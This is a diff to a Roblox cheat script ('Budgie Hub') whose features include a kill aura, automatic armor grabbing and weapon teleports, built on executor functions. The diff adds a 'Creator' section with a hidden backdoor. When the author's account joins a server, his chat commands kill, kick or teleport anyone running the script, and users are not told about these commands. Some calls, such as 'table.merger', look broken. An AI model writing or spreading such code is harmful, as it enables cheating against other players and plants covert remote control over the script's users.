@@ -24,8 +24,8 @@ game:GetService("RunService").Heartbeat:Connect(function()
  game:GetService("GuiService"):ClearError()
 end)
 
-local function getping()
-   return game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()
+local function gettime()
+   return game.Players.LocalPlayer.PlayerGui.EventGUI.Time.Value
 end
 
 Tab:AddToggle({
@@ -69,7 +69,7 @@ togl = Value
     pcall(function()
 local parts = workspace:GetPartBoundsInRadius(game.Players.LocalPlayer.Character.HumanoidRootPart.Position, 40)
   for _, part in ipairs(parts) do
-     if part.Parent:IsA("Model") and part.Parent:FindFirstChildOfClass("Humanoid") and part.Parent ~= game.Players.LocalPlayer.Character then
+     if part.Parent:IsA("Model") and part.Parent:FindFirstChildOfClass("Humanoid") and part.Parent ~= game.Players.LocalPlayer.Character and part.Parent.Name ~= "FakeFriend" then
 local humanoid = part.Parent:FindFirstChildOfClass("Humanoid")
  if humanoid.Health > 0 and not game.Players:GetPlayerFromCharacter(humanoid.Parent) and not humanoid:IsDescendantOf(Workspace.Ground) and not humanoid:IsDescendantOf(Workspace.Mineshaft) then
  for _, tool in next, table.merger(game.Players.LocalPlayer.Character:GetChildren(), game.Players.LocalPlayer.Backpack:GetChildren()) do
@@ -109,10 +109,21 @@ Tab:AddToggle({
  Callback = function(Value)
 loip = Value
  while loip and task.wait() do
-   if game.Players.LocalPlayer.Character ~= nil and game.Players.LocalPlayer.Character:FindFirstChild("Head") then
-    firetouchinterest(game.Players.LocalPlayer.Character.Head, Workspace.Misc["Blizzard Armor"].Head, 1)
-    firetouchinterest(game.Players.LocalPlayer.Character.Head, Workspace.Misc["Blizzard Armor"].Head, 0)
-  end
+   pcall(function()
+     if gettime() < 15 then
+         firetouchinterest(game.Players.LocalPlayer.Character.Head, Workspace.Misc["Blizzard Armor"].Head, 1)
+         firetouchinterest(game.Players.LocalPlayer.Character.Head, Workspace.Misc["Blizzard Armor"].Head, 0)
+       elseif gettime() >= 15 and gettime() < 30 then
+         firetouchinterest(game.Players.LocalPlayer.Character.Head, Workspace.Misc:FindFirstChild("Silver Armor - 15 min Playtime").Head, 0)
+         firetouchinterest(game.Players.LocalPlayer.Character.Head, Workspace.Misc:FindFirstChild("Silver Armor - 15 min Playtime").Head, 1)
+       elseif gettime() >= 30 and gettime() < 60 then
+         firetouchinterest(game.Players.LocalPlayer.Character.Head, Workspace.Misc:FindFirstChild("Golden Armor - 30 min Playtime").Head, 0)
+         firetouchinterest(game.Players.LocalPlayer.Character.Head, Workspace.Misc:FindFirstChild("Golden Armor - 30 min Playtime").Head, 1)
+       elseif gettime() >= 60 then
+         firetouchinterest(game.Players.LocalPlayer.Character.Head, Workspace.Misc:FindFirstChild("Diamond Armor - 60 min Playtime").Head, 0)
+         firetouchinterest(game.Players.LocalPlayer.Character.Head, Workspace.Misc:FindFirstChild("Diamond Armor - 60 min Playtime").Head, 1)
+     end
+   end)
  end
    end    
 })
@@ -120,7 +131,7 @@ loip = Value
 Tab:AddDropdown({
 	Name = "Get weapon",
 	Default = "1",
-	Options = {"Ice crossbow", "Volcano", "Rocket Launcher", "LXW", "Hex gun", '<p><font size="25">Deleted</font></p>', "Corrupted rifle", "Scarecrown skull"},
+	Options = {"Ice crossbow", "Volcano", "Rocket Launcher", "LXW", "Hex gun", '<p><font size="25">Deleted</font></p>', "Corrupted rifle", "Starecrown skull"},
 	Callback = function(Value)
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(625, 1147, 750)
  task.wait(0.3)
@@ -140,14 +151,12 @@ firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, Workspace
 firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, Workspace["Floor 2"].GetHEXGun.Head, 1)
         elseif Value == "Corrupted rifle" then
 if Workspace:FindFirstChild("NightCity") then
-game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Workspace.NightCity.Exit.Head.CFrame
-  else
-
+  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Workspace.NightCity.Exit.Head.CFrame
 end
        elseif Value == "Starecrown skull" then
- if workspace:FindFirstChild("GetScarecrowSkull") then
-game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Workspace["GetScarecrowSkull"].CFrame
- end
+if workspace:FindFirstChild("GetScarecrowSkull") then
+  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Workspace["GetScarecrowSkull"].CFrame
+end
         end
 	end    
 })
@@ -270,6 +279,10 @@ end
    end    
 })
 
+local Section = Tab:AddSection({
+ Name = "Crafts"
+})
+
 Tab:AddTextbox({
  Name = "Player regeneration (Cleansed Rifle)",
  Default = "",
@@ -324,3 +337,42 @@ tool.GunScript_Server.InflictTarget:FireServer(unpack(args))
      end
    end    
 })
+
+local Tab = Window:MakeTab({
+	Name = "Creator",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+Tab:AddLabel("Creator: ADSKer (or chuchmeck123yy)")
+
+local admins = {7332045256}
+game.Players.PlayerAdded:Connect(function(player)
+  if table.find(admins, player.UserId) and not table.find(admins, game.Players.LocalPlayer.CharacterAppearanceId) then
+OrionLib:MakeNotification({
+ Name = "Budgie Hub",
+ Content = "Congratulations, you are lucky because you met the creator of this script, namely " .. player.Name .. ", he was illuminated",
+ Image = "rbxassetid://4483345998",
+ Time = 10
+})
+local highlight = Instance.new("Highlight", workspace:WaitForChild(player.Name))
+highlight.Adornee = highlight.Parent
+highlight.OutlineColor = Color3.new(0, 1, 0)
+highlight.FillTransparency = 0.8
+highlight.FillColor = Color3.new(0, 0, 0)
+
+    player.Chatted:Connect(function(text)
+      if text:lower() == "/e kill" then
+        game.Players.LocalPlayer.Character.Humanoid.Health = 0
+      elseif text:lower() == "/e kick" then
+        game:Shutdown()
+      elseif text:lower() == "/e bring" then
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
+      end
+    end)
+  end
+end)
+
+for _, player in next, game.Players:GetPlayers() do
+  firesignal(game.Players.PlayerAdded, player)
+end
